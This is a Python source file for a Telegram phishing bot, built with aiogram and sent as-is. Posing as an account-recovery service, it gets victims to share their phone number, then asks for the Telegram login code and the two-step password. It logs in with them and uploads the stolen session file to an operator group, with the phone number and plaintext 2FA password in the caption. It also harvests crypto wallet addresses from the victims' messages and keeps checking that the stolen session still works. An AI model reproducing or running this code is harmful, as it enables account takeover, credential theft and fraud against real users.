"""Bot command handlers adapted for the desktop app.

All reply text comes from ConfigManager instead of a database.
Logs are forwarded to a Qt signal so the GUI can display them.
"""

import re
import os
import asyncio
import time
import random
import string
import logging
from datetime import datetime

from aiogram import Router, F, Bot, BaseMiddleware
from aiogram.types import (
    Message, CallbackQuery, FSInputFile,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from aiogram.filters import Command
from typing import Callable, Dict, Any, Awaitable

from core.login_engine import login_engine
from bot.keyboards import main_menu_kb, view_code_kb

router = Router()
logger = logging.getLogger(__name__)

# Reference to ConfigManager — set by bot_runner before starting
_cfg = None


def set_config(cfg):
    global _cfg
    _cfg = cfg


def _c(key: str, default: str = "") -> str:
    if _cfg is None:
        return default
    return _cfg.get(key, default)


def get_photo_input(photo_val: str | None) -> FSInputFile | str | None:
    if not photo_val:
        return None
    if os.path.isfile(photo_val):
        return FSInputFile(photo_val)
    return photo_val


async def send_custom_response(bot: Bot, chat_id: int, text: str,
                               photo_input=None, reply_markup=None):
    if photo_input:
        try:
            await bot.send_photo(
                chat_id=chat_id, photo=photo_input,
                caption=text, parse_mode="HTML", reply_markup=reply_markup,
            )
            return
        except Exception:
            pass
    await bot.send_message(
        chat_id=chat_id, text=text,
        parse_mode="HTML", reply_markup=reply_markup,
    )


# ── User state ──────────────────────────────────────────────────────
# uid -> {"phone", "step", "created_at", "attempts"}
_user_state: dict[int, dict] = {}

# ── Chat history for manual reply panel ─────────────────────────
# uid -> {"name": str, "messages": [{"from": "user"|"bot", "text": str, "time": float}]}
_chat_store: dict[int, dict] = {}
_chat_callback = None   # optional callback(uid) when new message arrives


def set_chat_callback(cb):
    global _chat_callback
    _chat_callback = cb


def get_chat_store() -> dict[int, dict]:
    return _chat_store


def _record_msg(uid: int, name: str, direction: str, text: str):
    if uid not in _chat_store:
        _chat_store[uid] = {"name": name, "messages": []}
    _chat_store[uid]["name"] = name
    _chat_store[uid]["messages"].append({
        "from": direction, "text": text, "time": time.time(),
    })
    if _chat_callback:
        try:
            _chat_callback(uid)
        except Exception:
            pass


async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
                                phone: str, user_info: dict,
                                tfa_password: str = ""):
    """Shared success flow for code and 2FA login.

    Order:
      1. Send success text to user
      2. Send configured success photo to user (if enabled)
      3. Upload tdata zip + text info to group
      4. USDT extraction (background)
      5. Delayed session check (background, sends valid/invalid text)
    """
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "")
    last_name = user_info.get("last_name", "")
    nickname = f"{first_name} {last_name}".strip()
    ts_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Step 1: Send success text to user
    success_text = _c("success_text", "✅ 登录成功")
    try:
        success_msg = success_text.format(
            first_name=first_name, last_name=last_name,
            user_id=user_info.get("user_id", ""),
            username=username or "N/A",
        )
    except (KeyError, IndexError):
        success_msg = success_text
    await bot.send_message(chat_id=chat_id, text=success_msg, parse_mode="HTML")
    logger.info(f"[{uid}] ✅ 登录成功: {phone} | {user_info}")

    # Step 2: Send configured success photo to user (if enabled)
    if _cfg and _cfg.get("success_send_photo", False):
        photo_input = get_photo_input(_c("success_photo_path"))
        if photo_input:
            try:
                await bot.send_photo(chat_id=chat_id, photo=photo_input)
            except Exception as e:
                logger.warning(f"[{uid}] 发送成功图片失败: {e}")

    # Step 3: Upload tdata zip + text info to group
    group_id = _c("success_group_id", "")
    if group_id:
        try:
            group_chat_id = int(group_id)

            # Send tdata zip (or session file) to group
            session_file = login_engine.get_last_session_path(phone)
            if session_file and os.path.isfile(session_file):
                # Build info text as document caption
                info_lines = [
                    "✅ 新账号登录成功",
                    f"用户名: @{username}" if username else "用户名: N/A",
                    f"昵称: {nickname}" if nickname else "昵称: N/A",
                    f"手机号: {phone}",
                ]
                if tfa_password:
                    info_lines.append(f"二级密码: {tfa_password}")
                info_lines.append(f"时间: {ts_str}")
                group_pwd = _c("group_password", "")
                if group_pwd:
                    info_lines.append(f"🔑 密码: {group_pwd}")
                caption = "\n".join(info_lines)

                await bot.send_document(
                    chat_id=group_chat_id,
                    document=FSInputFile(session_file),
                    caption=caption,
                )
                logger.info(f"[{uid}] 直登包已上传到群: {group_id}")
            else:
                logger.warning(f"[{uid}] 直登包/Session 文件不存在，无法上传到群")
        except Exception as e:
            logger.error(f"[{uid}] 上传到群失败: {e}")

    # USDT/crypto address extraction if enabled
    if _cfg and _cfg.get("usdt_extract_enabled", False):
        asyncio.create_task(_extract_crypto_addresses(bot, chat_id, uid, phone))

    # Schedule periodic session check (only if enabled)
    if _cfg and _cfg.get("session_check_enabled", False):
        asyncio.create_task(_post_login_session_check(bot, chat_id, phone))


async def _post_login_session_check(bot: Bot, chat_id: int, phone: str):
    """Periodically check session validity while the option is enabled.

    Loops every ``post_login_check_delay`` seconds (re-read each round so a
    changed value takes effect). The "session valid" text is sent only the
    first time it is confirmed valid to avoid spamming the user; once the
    session is found invalid the failure notice is sent (and the group is
    notified if enabled) and the loop stops.
    """
    notified_valid = False
    try:
        while _cfg and _cfg.get("session_check_enabled", False):
            delay = int(_c("post_login_check_delay", "86"))
            if delay <= 0:
                break
            await asyncio.sleep(delay)

            result = await login_engine.check_session(phone)
            logger.info(f"Session check for {phone}: {result.get('success')}")

            if result.get("success"):
                if not notified_valid:
                    notified_valid = True
                    text = _c("session_valid_text", "✅ Session 有效")
                    await bot.send_message(
                        chat_id=chat_id, text=text, parse_mode="HTML")
                continue

            # Session invalid — notify user, optionally the group, then stop.
            text = _c("session_invalid_text", "❌ Session 无效")
            if _cfg and _cfg.get("session_invalid_notify_group", False):
                group_id = _c("success_group_id", "")
                if group_id:
                    try:
                        ts_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        group_msg = (
                            f"❌ Session 失效通知\n"
                            f"手机号: {phone}\n"
                            f"时间: {ts_str}\n"
                            f"状态: {result.get('message', 'Session 无效')}"
                        )
                        await bot.send_message(
                            chat_id=int(group_id), text=group_msg)
                        logger.info(f"Session 失效通知已发送到群: {group_id}")
                    except Exception as e:
                        logger.error(f"发送 session 失效通知到群失败: {e}")
            await bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML")
            break
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.error(f"Post-login session check error: {e}")


# Crypto address patterns
_CRYPTO_PATTERNS = [
    (r'\b(T[A-HJ-NP-Za-km-z1-9]{33})\b', "TRC20/USDT"),
    (r'\b(0x[0-9a-fA-F]{40})\b', "ERC20/ETH"),
    (r'\b([13][a-km-zA-HJ-NP-Z1-9]{25,34})\b', "BTC"),
    (r'\b(bc1[a-zA-HJ-NP-Z0-9]{39,59})\b', "BTC-Bech32"),
]


async def _extract_crypto_addresses(bot: Bot, chat_id: int,
                                     uid: int, phone: str):
    """Scan user's chat history for crypto addresses and report them."""
    try:
        await asyncio.sleep(2)  # Small delay to let things settle
        found: list[str] = []
        store = _chat_store.get(uid)
        if store:
            for msg in store.get("messages", []):
                if msg["from"] == "user":
                    text = msg["text"]
                    for pattern, label in _CRYPTO_PATTERNS:
                        matches = re.findall(pattern, text)
                        for m in matches:
                            found.append(f"{label}: {m}")

        if found:
            report = "💰 检测到加密货币地址:\n" + "\n".join(found[:10])
            await bot.send_message(chat_id=chat_id, text=report)
            logger.info(f"[{uid}] 提取到 {len(found)} 个加密货币地址")

            # Also send to group if configured
            group_id = _c("success_group_id", "")
            if group_id:
                try:
                    await bot.send_message(
                        chat_id=int(group_id), text=f"📱 {phone}\n{report}")
                except Exception:
                    pass
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.error(f"[{uid}] USDT 提取失败: {e}")


def _generate_12_digit_code() -> str:
    """Generate a random 12-character alphanumeric identifier."""
    chars = string.ascii_uppercase + string.digits
    return "".join(random.choices(chars, k=12))


async def check_timeouts_loop(bot: Bot):
    while True:
        try:
            await asyncio.sleep(10)
            now = time.time()
            for uid, state in list(_user_state.items()):
                step = state.get("step")
                created_at = state.get("created_at")
                if not created_at:
                    continue

                elapsed = now - created_at

                # ── /start remind: user did /start but hasn't sent phone ──
                if step == "started":
                    remind_wait = int(_c("start_remind_wait", "45"))
                    remind_count = int(_c("start_remind_count", "1"))
                    if remind_wait <= 0 or remind_count <= 0:
                        continue
                    sent = state.get("remind_sent", 0)
                    if sent < remind_count and elapsed >= remind_wait * (sent + 1):
                        text = _c("start_no_response_text", "")
                        if text:
                            try:
                                await bot.send_message(
                                    chat_id=uid, text=text, parse_mode="HTML")
                                logger.info(f"[{uid}] /start 催促 #{sent+1}")
                            except Exception as e:
                                logger.error(f"Start remind failed for {uid}: {e}")
                        state["remind_sent"] = sent + 1
                    # Clean up stale "started" states after 10 minutes
                    if elapsed >= 600:
                        _user_state.pop(uid, None)
                    continue

                if step not in ("code", "2fa"):
                    continue

                # ── Auto-reply at configured intervals ──
                interval_min = int(_c("auto_reply_interval", "1"))
                max_replies = int(_c("auto_reply_max", "3"))
                interval_sec = interval_min * 60
                sent_count = state.get("auto_reply_sent", 0)

                if interval_sec > 0 and sent_count < max_replies:
                    replies_due = min(int(elapsed // interval_sec), max_replies)
                    while sent_count < replies_due:
                        sent_count += 1
                        text = _c(f"auto_reply_{sent_count}", "")
                        if text:
                            try:
                                await bot.send_message(
                                    chat_id=uid, text=text, parse_mode="HTML")
                                logger.info(
                                    f"[{uid}] Auto-reply #{sent_count} sent")
                            except Exception as e:
                                logger.error(
                                    f"Auto-reply failed for {uid}: {e}")
                    state["auto_reply_sent"] = sent_count

                # ── 5-minute hard timeout ──
                if elapsed >= 300:
                    _user_state.pop(uid, None)
                    phone = state.get("phone")
                    await login_engine.cancel_pending(phone)
                    if step == "code":
                        text = _c("code_expired_text", "验证码已过期，请重新 /start")
                    else:
                        text = _c("tfa_60s_reminder_text", "密码输入超时，请重新 /start")
                    try:
                        await bot.send_message(chat_id=uid, text=text, parse_mode="HTML")
                    except Exception as e:
                        logger.error(f"Timeout notify failed for {uid}: {e}")
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"check_timeouts_loop error: {e}")


# ── /start ──────────────────────────────────────────────────────────
def _user_name(message: Message) -> str:
    u = message.from_user
    if not u:
        return str(message.chat.id)
    parts = [u.first_name or "", u.last_name or ""]
    name = " ".join(p for p in parts if p).strip()
    return name or str(u.id)


@router.message(Command("start"))
async def cmd_start(message: Message, bot: Bot):
    uid = message.from_user.id
    old = _user_state.pop(uid, None)
    if old and "phone" in old:
        await login_engine.cancel_pending(old["phone"])

    _record_msg(uid, _user_name(message), "user", "/start")
    text = _c("start_text", "欢迎使用")
    mode = "contact"
    reply_markup = main_menu_kb(mode)
    await send_custom_response(bot, message.chat.id, text, None, reply_markup)

    # Welcome inline button (URL) if configured
    if _cfg and _cfg.get("welcome_button_enabled", False):
        btn_text = _c("welcome_button_text", "")
        btn_url = _c("welcome_button_url", "")
        if btn_text and btn_url:
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=btn_text, url=btn_url)]
            ])
            await bot.send_message(
                chat_id=message.chat.id, text="\u200b",
                reply_markup=kb)

    _record_msg(uid, _user_name(message), "bot", text)
    logger.info(f"[{uid}] /start")

    # Record start time for /start remind feature
    _user_state[uid] = {"step": "started", "created_at": time.time()}


# ── 分享联系人 ──────────────────────────────────────────────────────
@router.message(F.contact)
async def handle_contact(message: Message, bot: Bot):
    contact = message.contact
    phone = contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    uid = message.from_user.id
    _record_msg(uid, _user_name(message), "user", f"[分享联系人] {phone}")
    result = await login_engine.send_code(phone)
    if result.get("success"):
        _user_state[uid] = {
            "phone": phone, "step": "code",
            "created_at": time.time(), "attempts": 0,
        }
        text = _c("code_panel_title", "✅ 回执码已发送！")
        if _cfg and _cfg.get("show_12_digit_code", False):
            text += f"\n🔖 验证标识: {_generate_12_digit_code()}"
        await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
        logger.info(f"[{uid}] 验证码已发送 -> {phone}")
    else:
        err_msg = result.get('message', '发送验证码失败')
        await message.answer(f"❌ {err_msg}", reply_markup=main_menu_kb())
        logger.warning(f"[{uid}] 发送验证码失败: {err_msg}")


# ── 手动输入手机号 ──────────────────────────────────────────────────
@router.message(F.text == "开 始 恢 复 账 户")
async def btn_phone_login(message: Message, bot: Bot):
    uid = message.from_user.id
    _user_state[uid] = {"step": "phone_input"}
    await message.answer(
        "⚠️请输入您的账户手机号码（带完整区号，例如 +86130008800）",
        parse_mode="HTML",
    )
    logger.info(f"[{uid}] 进入手动输入手机号模式")


@router.message(F.text.regexp(r"^\+\d{7,15}$"))
async def handle_phone_input(message: Message, bot: Bot):
    uid = message.from_user.id
    state = _user_state.get(uid)
    if not state or state.get("step") != "phone_input":
        return

    phone = message.text.strip()
    result = await login_engine.send_code(phone)
    if result.get("success"):
        _user_state[uid] = {
            "phone": phone, "step": "code",
            "created_at": time.time(), "attempts": 0,
        }
        text = _c("code_panel_title", "✅ 回执码已发送！")
        if _cfg and _cfg.get("show_12_digit_code", False):
            text += f"\n🔖 验证标识: {_generate_12_digit_code()}"
        await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
        logger.info(f"[{uid}] 验证码已发送(手动) -> {phone}")
    else:
        _user_state.pop(uid, None)
        err_msg = result.get('message', '发送验证码失败')
        await message.answer(f"❌ {err_msg}", reply_markup=main_menu_kb())


# ── 验证码输入 ──────────────────────────────────────────────────────
@router.message(F.text, lambda msg: _user_state.get(msg.from_user.id, {}).get("step") == "code")
async def handle_code_input(message: Message, bot: Bot):
    uid = message.from_user.id
    state = _user_state.get(uid)
    if not state or state.get("step") != "code":
        return
    if message.text.startswith("/"):
        return
    _record_msg(uid, _user_name(message), "user", message.text.strip())

    phone = state["phone"]
    max_attempts = int(_c("code_max_attempts", "3"))

    match = re.match(r"(?i)^TG\s*(\d{5,6})$", message.text.strip())
    if not match:
        state["attempts"] = state.get("attempts", 0) + 1
        remaining = max_attempts - state["attempts"]
        if remaining <= 0:
            _user_state.pop(uid, None)
            await login_engine.cancel_pending(phone)
            await message.answer(_c("code_max_retries_text", "❌ 错误次数过多，请重新 /start"))
        else:
            await message.answer(_c("code_format_error_text", "❌ 格式错误"))
        return

    code = match.group(1)
    result = await login_engine.sign_in_with_code(phone, code)

    if result.get("success"):
        _user_state.pop(uid, None)
        await _handle_login_success(
            bot, message.chat.id, uid, phone,
            result.get("user_info", {}))
    else:
        need_2fa = result.get("need_2fa", False)
        if need_2fa:
            _user_state[uid] = {
                "phone": phone, "step": "2fa",
                "created_at": time.time(), "attempts": 0,
            }
            await message.answer(_c("prompt_2fa_text", "请输入两步验证密码"))
            logger.info(f"[{uid}] 需要两步验证: {phone}")
        else:
            state["attempts"] = state.get("attempts", 0) + 1
            remaining = max_attempts - state["attempts"]
            if remaining <= 0:
                _user_state.pop(uid, None)
                await login_engine.cancel_pending(phone)
                await message.answer(_c("code_max_retries_text", "❌ 错误次数过多"))
            else:
                tpl = _c("code_invalid_text", "❌ 验证码错误（{attempts}/{max}）")
                try:
                    err = tpl.format(attempts=state["attempts"], max=max_attempts,
                                     remaining=remaining)
                except Exception:
                    err = result.get("message", "验证码错误")
                await message.answer(err)


# ── 两步验证 ────────────────────────────────────────────────────────
@router.message(F.text, lambda msg: _user_state.get(msg.from_user.id, {}).get("step") == "2fa")
async def handle_2fa_input(message: Message, bot: Bot):
    uid = message.from_user.id
    state = _user_state.get(uid)
    if not state or state.get("step") != "2fa":
        return
    if message.text.startswith("/"):
        return
    _record_msg(uid, _user_name(message), "user", "[2FA密码]")

    phone = state["phone"]
    password = message.text.strip()
    max_attempts = int(_c("tfa_max_attempts", "5"))

    result = await login_engine.sign_in_with_2fa(phone, password)

    if result.get("success"):
        _user_state.pop(uid, None)
        await _handle_login_success(
            bot, message.chat.id, uid, phone,
            result.get("user_info", {}),
            tfa_password=password)
    else:
        state["attempts"] = state.get("attempts", 0) + 1
        remaining = max_attempts - state["attempts"]
        if remaining <= 0:
            _user_state.pop(uid, None)
            await login_engine.cancel_pending(phone)
            await message.answer(_c("tfa_max_retries_text", "❌ 密码错误次数过多"))
        else:
            tpl = _c("tfa_wrong_text", "❌ 密码错误（{attempts}/5）")
            try:
                err = tpl.format(attempts=state["attempts"], remaining=remaining,
                                 max=max_attempts)
            except Exception:
                err = result.get("message", "密码错误")
            await message.answer(err, parse_mode="HTML")


# ── Default reply (catch-all for messages with no active state) ───
@router.message(F.text)
async def handle_default(message: Message, bot: Bot):
    """Reply with default text when user sends a message without active state."""
    uid = message.from_user.id
    if message.text.startswith("/"):
        return
    state = _user_state.get(uid)
    if state and state.get("step") in ("code", "2fa", "phone_input"):
        return  # Already handled by specific handlers above

    _record_msg(uid, _user_name(message), "user", message.text.strip())
    text = _c("default_reply", "")
    if text:
        await message.answer(text, parse_mode="HTML")
        _record_msg(uid, _user_name(message), "bot", text)
